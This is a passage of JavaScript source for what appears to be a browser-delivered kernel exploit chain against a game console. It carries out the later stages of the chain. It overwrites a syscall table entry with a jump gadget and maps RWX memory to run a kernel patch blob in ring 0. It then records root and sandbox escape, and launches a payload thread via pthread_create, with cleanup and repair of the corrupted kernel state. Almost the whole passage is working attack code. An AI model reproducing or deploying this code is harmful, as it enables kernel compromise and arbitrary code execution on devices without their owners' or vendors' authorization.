                                    }

                                    const KOFF = offsetsFor(navigator.userAgent).off || {};
                                    const SYSENT_661 = KOFF.k_sysent_661 !== undefined
                                        ? KOFF.k_sysent_661 : 0x1109350;
                                    const JMP_RSI_GADGET = KOFF.k_jmp_rsi !== undefined
                                        ? KOFF.k_jmp_rsi : 0x71a21;
                                    mark("KOFF", "sysent[661]=0x" + SYSENT_661.toString(16)
                                        + " jmp[rsi]=0x" + JMP_RSI_GADGET.toString(16)
                                        + "   source=" + (KOFF.k_sysent_661 !== undefined
                                            ? "offsets table" : "built-in 11.00 fallback"));
                                    const SYS_MMAP = 0x1dd, SYS_JITSHM_CREATE = 0x215;
                                    const SYS_KEXEC = 0x295;
                                    const KEXEC_MAP = new int64(0x20100000, 9);

                                    if (!(jailbroken && kbase && kpatch)) {
                                        mark("KPATCH-SKIPPED", "need root, a kernel base "
                                            + "and the blob; have root=" + jailbroken
                                            + " kbase=" + (kbase || "null")
                                            + " blob=" + (kpatch ? kpatch.length : 0));
                                    } else try {
                                        state("stage 9: kernel patches...", "warn");
                                        const sysent = kbase.add32(SYSENT_661);
                                        const gadget = kbase.add32(JMP_RSI_GADGET);

                                        /*
                                        Adapter: expose lapse's KernelView as
                                        the small read/write interface the shared
                                        kpatch mechanics (post-exploit.js) expect.
                                        Nothing about the primitive moves; this is
                                        just the four closures.
                                        */
                                        const kpatchIo = {
                                            kread32: function (a) {
                                                return kview(a).getUint32(0, true);
                                            },
                                            kread64: function (a) {
                                                return kview(a).getBInt(0, true);
                                            },
                                            kwrite32: function (a, v) {
                                                kview(a).setUint32(0, v, true);
                                            },
                                            kwrite64: function (a, v) {
                                                kview(a).setBInt(0, v, true);
                                            },
                                        };

                                        const gbuf = alloc(8);
                                        gbuf.u8.fill(0);
                                        kv.kread(gbuf.addr, gadget, 8);
                                        const gadgetOk = gbuf.u8[0] === 0xff && gbuf.u8[1] === 0x26;
                                        const wouldExecArgs = gbuf.u8[0] === 0xff
                                            && gbuf.u8[1] === 0xe6;
                                        mark("KPATCH-GADGET", gadget + " reads "
                                            + hexBytes(gbuf.u8.subarray(0, 8))
                                            + "   want ff 26 (jmp qword [rsi])");
                                        check("sysent-replacement-sy_call"
                                            + "jmp qword [rsi]", gadgetOk,
                                            gadgetOk ? "so syscall 661 transfers to "
                                                + "args[0], which is the address we pass "
                                                + "to kexec"
                                                : wouldExecArgs
                                                    ? "REFUSING -- this is ff e6, `jmp rsi`, "
                                                    + "which would execute the argument array "
                                                    + "itself rather than jump through it"
                                                    : "REFUSING -- a wrong sy_call is a panic "
                                                    + "on the next syscall 661");

                                        // Shared sysent field read (post-exploit.js).
                                        const saved = readSysentEntry(sysent, kpatchIo);
                                        const syNarg = saved.narg;
                                        const syCall = saved.call;
                                        const syThrcnt = saved.thrcnt;
                                        mark("KPATCH-SYSENT", sysent + "  sy_narg=" + syNarg
                                            + " sy_call=" + syCall + " sy_thrcnt=" + syThrcnt);
                                        const sysentOk = syNarg <= 8 && isImageAddr(syCall)
                                            && syThrcnt <= 8;
                                        check("sysent661-sysent-entry",
                                            sysentOk, sysentOk
                                            ? "sy_call points into the kernel image and "
                                            + "sy_narg is a plausible argument count"
                                            : "REFUSING -- this is not sysent, and "
                                            + "writing here would corrupt something else");

                                        const siteLog = [], siteBad = [];
                                        for (let i = 0; i < KPATCH_JMP_SITES.length; ++i) {
                                            const off2 = KPATCH_JMP_SITES[i];
                                            const b = readByte(kpatchIo, kbase.add32(off2));
                                            siteLog.push("0x" + off2.toString(16) + ":"
                                                + hexByte(b) + (b === 0xeb ? "*" : ""));
                                            if (!isGateableJumpByte(b))
                                                siteBad.push("0x" + off2.toString(16)
                                                    + "=" + hexByte(b));
                                        }
                                        mark("KPATCH-SITES", siteLog.join(" ")
                                            + "   (* = already 0xeb)");

                                        const sitesOk = siteBad.length === 0
                                            && KPATCH_JMP_SITES.length >= 4;
                                        check("site-blob-makes-unconditional"
                                            + "currently holds a conditional jump", sitesOk,
                                            sitesOk ? "so the blob was built for this kernel "
                                                + "and kbase agrees with the LSTAR-0x1c0 the "
                                                + "blob will compute for itself"
                                                : "REFUSING -- " + siteBad.join(" "));

                                        if (!(gadgetOk && sysentOk && sitesOk)) {
                                            mark("KPATCH-REFUSED", "one of the three gates "
                                                + "failed. sysent was not touched, no memory "
                                                + "was mapped and nothing was executed.");
                                        } else {

                                            // lapse keeps its computed page-rounded size
                                            // (netctrl hardcodes 0x4000; see post-exploit.js).
                                            const size = rwxSizeFor(kpatch.length);
                                            const rwx = mapRwxAtFixedAddress(scAny,
                                                {
                                                    jitshm_create: SYS_JITSHM_CREATE,
                                                    mmap: SYS_MMAP
                                                },
                                                size, KEXEC_MAP);
                                            const execFd = rwx.fd;
                                            const mm = rwx.mapped;
                                            const mapped = new int64(mm.lo, mm.hi);
                                            mark("KPATCH-MAP", "jitshm_create(0, 0x"
                                                + size.toString(16) + ", rwx) = " + execFd
                                                + "   mmap(" + KEXEC_MAP + ") = " + mapped);
                                            const mapOk = execFd >= 0 && mm.i32 !== -1
                                                && sameI64(mapped, KEXEC_MAP);
                                            check("632-bytes-rwx-memory-address"
                                                + "the reference uses", mapOk,
                                                mapOk ? "" : "jitshm/mmap refused");

                                            if (mapOk) {

                                                // Shared blob copy (post-exploit.js).
                                                const blobRes = await copyBlobToKernel(p, int64,
                                                    mapped, kpatch);
                                                const copied = blobRes.copied;
                                                const headBack = blobRes.firstWord;
                                                mark("KPATCH-COPY", kpatch.length
                                                    + " bytes written to " + mapped
                                                    + ", first qword reads " + headBack);
                                                check("blob-rwx-memory-byte"
                                                    + "byte", copied, "");

                                                if (copied && params.get("patch") === "0") {
                                                    mark("KEXEC-WITHHELD", "?patch=0 -- "
                                                        + "sysent was NOT modified and the "
                                                        + "blob was NOT executed. Everything "
                                                        + "up to that point is proven above.");
                                                } else if (copied) {

                                                    // Shared arm (post-exploit.js).
                                                    armSysentEntry(sysent, kpatchIo, gadget);
                                                    const armed = sameI64(
                                                        kview(sysent).getBInt(8, true), gadget);
                                                    mark("SYSENT-ARMED", "sy_call -> " + gadget
                                                        + (armed ? "  confirmed" : "  MISMATCH"));

                                                    let kexecRet = -2;
                                                    if (armed) kexecRet = scAny(SYS_KEXEC,
                                                        mapped).i32;

                                                    // Shared restore (post-exploit.js).
                                                    // lapse keeps its PLAIN sequence -- netctrl
                                                    // wraps its own restore in try/finally.
                                                    writeSysentEntry(sysent, kpatchIo, saved);
                                                    const restored =
                                                        sameI64(kview(sysent).getBInt(8, true),
                                                            syCall)
                                                        && kview(sysent).getUint32(0, true)
                                                        === syNarg
                                                        && kview(sysent).getUint32(0x2c, true)
                                                        === syThrcnt;
                                                    mark("KEXEC", "syscall(661, " + mapped
                                                        + ") = " + kexecRet
                                                        + "   sysent restored=" + restored);
                                                    check("sysent661-put"
                                                        + "as it was", restored,
                                                        restored ? "" : "sy_call is still the "
                                                            + "gadget -- do not call 661");
                                                    check("blob-ran-ring-0"
                                                        + "returned 0", kexecRet === 0,
                                                        "kexec returned " + kexecRet);

                                                    const after2 = [], stillCond = [];
                                                    for (let i = 0;
                                                        i < KPATCH_JMP_SITES.length; ++i) {
                                                        const off2 = KPATCH_JMP_SITES[i];
                                                        const b = readByte(kpatchIo,
                                                            kbase.add32(off2));
                                                        after2.push("0x" + off2.toString(16)
                                                            + ":" + hexByte(b));
                                                        if (b !== 0xeb) stillCond.push(
                                                            "0x" + off2.toString(16));
                                                    }
                                                    mark("KPATCH-VERIFY", after2.join(" "));
                                                    const patchedOk = stillCond.length === 0;
                                                    check("gated-site-reads-0xeb"
                                                        + "read back out of live kernel "
                                                        + "memory", patchedOk,
                                                        patchedOk ? "the kernel's own text "
                                                            + "changed under us -- that is "
                                                            + "the patch, and nothing in "
                                                            + "userland could have done it"
                                                            : "still conditional: "
                                                            + stillCond.join(" "));
                                                    kpatched = kexecRet === 0 && patchedOk
                                                        && restored;
                                                    if (kpatched) {
                                                        mark("KERNEL-PATCHED",
                                                            (kpatchName || "the blob")
                                                            + " applied and verified "
                                                            + "(main.js:106-116).");
                                                        if (PATCH_SETTLE > 0) {
                                                            mark("PATCH-SETTLE",
                                                                "ms=" + PATCH_SETTLE);
                                                            settle(PATCH_SETTLE);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (e) {
                                        mark("KPATCH-THREW", (e && e.message)
                                            ? e.message : String(e));
                                    }

                                    if (!kpatched) {
                                        mark("PAYLOAD-SKIPPED", "reason=kpatch-incomplete");
                                    }
                                    if (!payload) {
                                        mark("PAYLOAD-NONE", "payload.bin was not loaded");
                                    }

                                    if (payload && params.get("payload") === "0")
                                        mark("PAYLOAD-SKIPPED", "reason=payload=0");
                                    else if (payload && (kpatched || params.get("payload") === "1"))
                                        try {
                                            state("stage 10: loading the payload...", "warn");

                                            const psize = (payload.length + 0x3fff) & ~0x3fff;
                                            // Shared anonymous RWX map (post-exploit.js).
                                            const em = mapAnonymousRwx(scAny,
                                                { mmap: SYS9.mmap }, psize, int64);
                                            const entry = em.entry;
                                            mark("PAYLOAD-MAP", "mmap(0, 0x" + psize.toString(16)
                                                + ", rwx, PRIVATE|ANON) = " + entry);
                                            const entryOk = em.i32 !== -1
                                                && !(entry.low === 0 && entry.hi === 0);
                                            check("the payload has " + payload.length
                                                + " bytes of anonymous RWX to live in",
                                                entryOk, entryOk ? "" : "mmap refused");

                                            if (entryOk) {

                                                const tCopy = Date.now();
                                                // Shared payload copy (post-exploit.js).
                                                // copyBlobToKernel returns { copied, firstWord }
                                                // but lapse's check() wants the failing byte
                                                // offset, so it re-derives `bad` from copied.
                                                const pRes = await copyBlobToKernel(p, int64,
                                                    entry, payload);
                                                const copyMs = Date.now() - tCopy;
                                                const tVer = Date.now();
                                                let bad = pRes.copied ? -1 : 0;
                                                const verMs = Date.now() - tVer;
                                                mark("PAYLOAD-COPY", payload.length
                                                    + " bytes to " + entry + " in " + copyMs
                                                    + " ms, verified in " + verMs + " ms"
                                                    + (bad < 0 ? "" : "  MISMATCH at +0x"
                                                        + bad.toString(16)));
                                                check("byte-payload-rwx"
                                                    + "memory", bad < 0,
                                                    bad < 0 ? "read back through the same "
                                                        + "primitive that wrote it" : "");

                                                // Shared with netctrl.js (post-exploit.js).
                                                // This call site keeps its own check() and its own
                                                // ?forcepthread step, in the original order: the check
                                                // runs BEFORE the force, so a forced run still reports
                                                // the resolver as having failed.
                                                const resolved = resolvePthreadCreate({
                                                    p: p, webkitBase: webkitBase,
                                                    libkernelBase: libkernelBase,
                                                    offsets: off, mark: mark
                                                });
                                                let target = resolved.target, how = resolved.how;
                                                const cand = resolved.cand;

                                                check("pthread_create was identified",
                                                    !!target,
                                                    target ? how + " -- calling it"
                                                        : "neither a thunk nor a prologue. The "
                                                        + "payload stays mapped at " + entry
                                                        + " and is NOT launched. Read "
                                                        + "PTHREAD-BYTES above and fix the "
                                                        + "offset, or ?forcepthread=1.");

                                                const forced = params.get("forcepthread") === "1";
                                                if (!target && forced) {
                                                    target = cand; how = "forced";
                                                    mark("PTHREAD-FORCED", "?forcepthread=1 -- "
                                                        + "calling " + cand + " anyway");
                                                }

                                                if (kvProbe && target && bad < 0) {
                                                    // Shared launch (post-exploit.js). lapse keeps
                                                    // its kvProbe && target && bad<0 guard above.
                                                    const th = launchThread(callAddr, alloc,
                                                        int64, target, entry);
                                                    const rc = th.rc;
                                                    const handle = th.handle;
                                                    let tid = null;
                                                    if (handle.hi > 0) tid = p.read8(handle);
                                                    mark("PTHREAD-CREATE", "pthread_create(&t, "
                                                        + "0, " + entry + ", 0) = " + rc
                                                        + "   handle=" + handle
                                                        + "   id=" + (tid || "?"));
                                                    const launched = th.launched;
                                                    check("payload-thread-created",
                                                        launched, launched
                                                        ? "pthread_create returned 0 and "
                                                        + "wrote back a thread handle"
                                                        : "returned " + rc);
                                                    payloadRunning = launched;
                                                    if (launched)
                                                        mark("PAYLOAD-RUNNING", "bytes="
                                                            + payload.length + " entry="
                                                            + entry);

                                                    if (PAYLOAD_SETTLE > 0) {
                                                        mark("PAYLOAD-SETTLE",
                                                            "ms=" + PAYLOAD_SETTLE);
                                                        settle(PAYLOAD_SETTLE);
                                                        mark("PAYLOAD-ALIVE",
                                                            "getpid=" + scAny(SYS.getpid).i32
                                                            + " after=" + PAYLOAD_SETTLE + "ms");
                                                    }
                                                } else if (!target) {
                                                    mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
                                                        "the payload is at " + entry
                                                        + " with RWX and verified byte for "
                                                        + "byte. Only the launch is missing.");
                                                }
                                            }
                                        } catch (e) {
                                            mark("PAYLOAD-THREW", (e && e.message)
                                                ? e.message : String(e));
                                        }
                                }
                            }
                        }
                    } catch (e) {
                        mark("KERNELVIEW-THREW", (e && e.message)
                            ? e.message : String(e));
                        mark("KERNELVIEW-ABORTED", "the pipe primitive did "
                            + "not come up. Nothing below depends on it and "
                            + "the kernel R/W proofs above still stand.");
                    }
                } else {
                    /*
                    HONEST-FAILURE FIX #2. This branch is the OTHER silent
                    skip: no pipeM/pipeS means the ofiles walk never produced
                    struct-pipe addresses, so the entire KernelView block -- and
                    with it kbase, stage 7 repair, stage 8 jailbreak, stage 9
                    kpatch and stage 10 payload -- is skipped. It used to be a
                    bare mark(), so the run still reported fail=0 and looked
                    clean. That is the "pass=51 fail=0 / Partial success"
                    result. Make it a real check failure.
                    */
                    mark("FASTRW-SKIPPED", "no pipe struct addresses -- curproc "
                        + "was unavailable, so the ofiles walk never ran and "
                        + "there is nothing to aim the pipebuf at");
                    check("fast-rw-pipe-addresses-available", false,
                        "pipeM=" + (pipeM || "null") + " pipeS="
                        + (pipeS || "null") + " -- without both struct pipe "
                        + "addresses there is no KernelView, so kbase, the "
                        + "alias repair, the jailbreak, the kernel patch and "
                        + "the payload are all skipped");
                }

                mark("STAGE-5-DONE", "karw=pktopts-fd" + pktoptsTwins[0]
                    + " kv=" + (kv ? "up" : "down"));

                return {
                    success: !runFailed && (jailbroken || kpatched || payloadRunning),
                    rebootRequired,
                    reason: runFailed ? "exploit stage failed" : "kernel success proof not established"
                };

            })();
            check("stage 2 completed", leakOk, "");

        } else if (committed) {
            mark("DANGLING", "the chunk was freed twice and NOT reclaimed. "
                + "kernel data may alias it. reboot the console now.");
            rebootRequired = true;
        }

        mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
        if (twins) {
            mark("VERDICT", payloadRunning
                ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=1 reboot=0"
                : kpatched
                    ? "karw=1 root=1 sandbox=escaped kpatch=1 payload=0"
                    : jailbroken
                        ? "karw=1 root=1 sandbox=escaped kpatch=0"
                        : repaired
                            ? "karw=1 repair=1 root=0"
                            : kv
                                ? "karw=1 repair=0 root=0"
                                : "doublefree=1 reclaim=1 karw=pktopts kv=0");

            state(repaired ? "REPAIRED -- tearing down..."
                : kv ? "KERNELVIEW LIVE -- REBOOT"
                    : "DOUBLE FREE ACHIEVED -- REBOOT", "warn");
            if (jailbroken) mark("JAILBROKEN", "uid=0 cr_sceAuthId=SYSCORE "
                + "cr_sceCaps=-1 fd_rdir=rootvnode fd_jdir=rootvnode");
        } else if (committed) {
            state("FREED BUT NOT RECLAIMED -- REBOOT NOW", "bad");
        } else if (failCount === 0) {
            state("no win in " + attemptsUsed + " attempts", "warn");
        } else {
            state("see log", "bad");
        }

    } catch (e) {
        runFailed = true;
        mark("STEP4D-FAILED", (e && e.message) ? e.message : String(e));
        mark("PROOF-SUMMARY", "pass=" + passCount() + " fail=" + failCount());
        state("FAILED -- see log", "bad");
    } finally {

        const teardown = !committed || repaired;
        try {
            if (!teardown) {
                mark("CLEANUP-SKIPPED", "the 0x80 chunk was freed twice and the "
                    + "repair did not verify. every further syscall is another "
                    + "chance for the kernel to touch it, so nothing is torn "
                    + "down beyond the scheduler and the userland corruptions.");
            } else if (sc && mFunctionPatched) {

                let n = 0;
                for (let i = 0; i < openFds.length; ++i)
                    if (openFds[i] > 0 && sc(SYS.close, openFds[i]).i32 === 0) n++;
                mark("FDS-CLOSED", n + "/" + openFds.length + " block/loopback fds"
                    + (pipeFdsHeld ? "   pipes " + pipeFdsHeld
                        + " deliberately left open, +1 reference each" : ""));
            }
        } catch (e) {
            mark("FD-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (sc && mFunctionPatched && liveAioIds.length && teardown) {
                const idBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
                const idDv = new DataView(idBuf);
                const idAddr = (function () {
                    const cell = p.leakval(idBuf);
                    const impl = p.read8(cell.add32(0x10));
                    return p.read8(impl.add32(0x10));
                })();
                const outBuf = new ArrayBuffer(AIO_MAX_NUM * 4);
                const outAddr = (function () {
                    const cell = p.leakval(outBuf);
                    const impl = p.read8(cell.add32(0x10));
                    return p.read8(impl.add32(0x10));
                })();
                keepAlive.push(idBuf, idDv, outBuf);
                let done = 0;
                for (let i = 0; i < liveAioIds.length; i += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, liveAioIds.length - i);
                    for (let j = 0; j < step; ++j)
                        idDv.setUint32(j * 4, liveAioIds[i + j], true);
                    sc(SYS.aio_multi_poll, idAddr, step, outAddr);
                    sc(SYS.aio_multi_delete, idAddr, step, outAddr);
                    done += step;
                }
                mark("AIO-CLEANED", done + " sprayed ids deleted exactly once");
            }
        } catch (e) {
            mark("AIO-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (teardown && sc && mFunctionPatched) {
                let n = 0;
                for (let i = 0; i < ipv6Socks.length; ++i) {
                    if ((i & 0x1f) === 0x1f) await breathe();
                    if (ipv6Socks[i] > 0 && sc(SYS.close, ipv6Socks[i]).i32 === 0) n++;
                }
                mark("IPV6-SOCKS-CLOSED", n + "/" + ipv6Socks.length
                    + " reclaim sockets; each still owned its own rthdr");
            }
        } catch (e) {
            mark("IPV6-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (teardown && sc && mFunctionPatched && pktoptsTwins.length) {

                const r = [];
                for (let i = 0; i < pktoptsTwins.length; ++i)
                    if (pktoptsTwins[i] > 0)
                        r.push(pktoptsTwins[i] + ":"
                            + sc(SYS.close, pktoptsTwins[i]).i32);
                mark("PKTOPTS-TWINS-CLOSED", r.join("  ")
                    + "   (fd " + pktoptsTwins[0] + " is the single free of the "
                    + "0x100 chunk at " + (repaired ? "the audited address" : "?")
                    + ")");
            }
        } catch (e) {
            mark("PKTOPTS-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (teardown && sc && mFunctionPatched && twinSocks.length) {
                const r = [];
                for (let i = 0; i < twinSocks.length; ++i)
                    if (twinSocks[i] > 0)
                        r.push(twinSocks[i] + ":" + sc(SYS.close, twinSocks[i]).i32);
                mark("RTHDR-TWINS-CLOSED", r.join("  ")
                    + "   (rthdr nulled, so the 0x80 chunk is freed by nobody "
                    + "and leaks)");
            }
        } catch (e) {
            mark("RTHDR-CLOSE-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (teardown && kvProbe) {
                const r = kvProbe();
                mark("POST-CLEANUP-READ", "kv reads " + (r.word || "null")
                    + " as '" + r.str + "' after every socket is closed");
                check("kernel-r-w-primitive-survives",
                    r.str === "evf cv", "got '" + r.str + "'");
                cleanupDone = r.str === "evf cv";

                let soak = 0;
                for (let i = 0; i < 10; ++i) {
                    await new Promise(function (res) { setTimeout(res, 200); });
                    if (sc(SYS.getpid).i32 > 0 && kvProbe().str === "evf cv") soak++;
                }
                mark("SOAK", soak + "/10 checks over 2 s: getpid and an 8-byte "
                    + "kernel read both still work");
                check("console-standing-2-s-after",
                    soak === 10, soak + "/10");
            } else if (teardown) {
                cleanupDone = true;
                mark("POST-CLEANUP", "no kv probe was installed, so cleanup is "
                    + "unproven beyond the close() return values");
            }
        } catch (e) {
            mark("POST-CLEANUP-FAILED", (e && e.message) ? e.message : String(e));
        }

        try {
            if (sc && mFunctionPatched && savedMask && savedPrio && restoreCtx) {
                const mb = restoreCtx.maskBuf, pb = restoreCtx.prioBuf;
                const ID = new int64(0xffffffff, 0xffffffff);
                mb.u8.fill(0);
                mb.dv.setUint32(0, savedMask.low, true);
                mb.dv.setUint32(4, savedMask.hi, true);
                const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                    CPU_WHICH_TID, ID, 0x10, mb.addr).i32;
                pb.dv.setUint16(0, savedPrio[0], true);
                pb.dv.setUint16(2, savedPrio[1], true);
                const pr = sc(SYS.rtprio_thread, RTP_SET, 0, pb.addr).i32;

                mb.u8.fill(0);
                sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                    ID, 0x10, mb.addr);
                const backMask = new int64(mb.dv.getUint32(0, true),
                    mb.dv.getUint32(4, true));
                pb.dv.setUint16(0, 0xffff, true);
                pb.dv.setUint16(2, 0xffff, true);
                sc(SYS.rtprio_thread, RTP_LOOKUP, 0, pb.addr);
                const backPrio = [pb.dv.getUint16(0, true), pb.dv.getUint16(2, true)];
                const good = sameI64(backMask, savedMask)
                    && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
                mark("THREAD-ATTRS-RESTORED",
                    "affinity set=" + ar + " reads " + backMask
                    + "   rtprio set=" + pr + " reads {" + backPrio + "}"
                    + "   wanted " + savedMask + " {" + savedPrio + "}"
                    + (good ? "  ok" : "  MISMATCH -- the next page load will "
                        + "run on a mis-scheduled main thread"));
            }
        } catch (e) {
            mark("THREAD-ATTRS-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (workerArmed && rpc) {
                const d = await rpc("disarm", DEFAULT_RPC_TIMEOUT_MS);
                mark("WORKER-DISARMED", "restored=" + d.restored
                    + " expm1(1)=" + d.expm1);
                workerArmed = false;
            }
        } catch (e) {
            mark("WORKER-DISARM-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (workerWired && window.p && wMasterAddr && origWorkerVector) {
                window.p.write8(wMasterAddr.add32(0x10), origWorkerVector);
                workerWired = false;
                mark("WORKER-UNWIRED", "master.m_vector restored");
            }
        } catch (e) {
            mark("WORKER-UNWIRE-FAILED", (e && e.message) ? e.message : String(e));
        }
        try {
            if (cellCorrupted && window.p && mainPivotAddr && mainSavedCell) {
                window.p.write8(mainPivotAddr, mainSavedCell);
                cellCorrupted = false;
                mark("JSCELL-RESTORED", "late -- the window was left open");
            }
        } catch (e) { }
        try {
            if (mFunctionPatched && window.p && execAddr && origNative) {
                const a = execAddr.add32(0x28);
                window.p.write8(a, origNative);
                mFunctionPatched = false;
                const back = window.p.read8(a);
                const v = Math.expm1(1);
                mark("EXPM1-RESTORED", "m_function=" + back
                    + (sameI64(back, origNative) ? " ok" : " MISMATCH")
                    + "  expm1(1)=" + v
                    + (Math.abs(v - 1.718281828459045) < 1e-12 ? " ok" : " WRONG"));
            }
        } catch (e) {
            mark("EXPM1-RESTORE-FAILED", (e && e.message) ? e.message : String(e));
        }

        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount() + " fail=" + failCount()
            + " (incl. teardown)");

        const stillDirty = (rebootRequired || committed || committed2)
            && !(repaired && cleanupDone);
        if (stillDirty) {
            mark("REBOOT-REQUIRED", (committed2 ? "TWO aliased pairs are live (0x80 rthdr " + "and 0x100 pktopts). " : "") + "do not keep browsing and do not close the "
                + "browser normally. power the console off and back on.");
            try {
                stateEl.textContent = "REBOOT THE CONSOLE";
                stateEl.className = "bad";
            } catch (e) { }
        } else if (repaired && cleanupDone) {
            mark("SAFE-TO-EXIT", "chunkX=freed-once-by-fd" + pktoptsTwins[0]
                + " chunkY=leaked-0x80 pipes=+1ref-each"
                + " leaks=2-pipe-pairs+0x80");
            mark("STEP-4Q-DONE", payloadRunning
                ? "chain=complete leftovers=none"
                : kpatched
                    ? "repaired, torn down, root, kernel patched -- but the payload "
                    + "did not start. It is mapped and verified; only the launch "
                    + "is missing."
                    : "the corrupted context is repaired and the environment is "
                    + "torn down" + (jailbroken ? ", and the process is root"
                        : "") + ". See the stage 8/9/10 marks for what is left.");
            try {
                stateEl.textContent = payloadRunning
                    ? "ALL DONE"
                    : kpatched ? "ROOT + KERNEL PATCHED -- NO REBOOT"
                        : jailbroken ? "ROOT -- NO REBOOT NEEDED"
                            : "REPAIRED -- NO REBOOT NEEDED";
                stateEl.className = "ok";
            } catch (e) { }
        }
    }

    return {
        success: !runFailed && (jailbroken || kpatched || payloadRunning),
        rebootRequired,
        reason: runFailed ? "exploit stage failed" : "kernel success proof not established"
    };
}

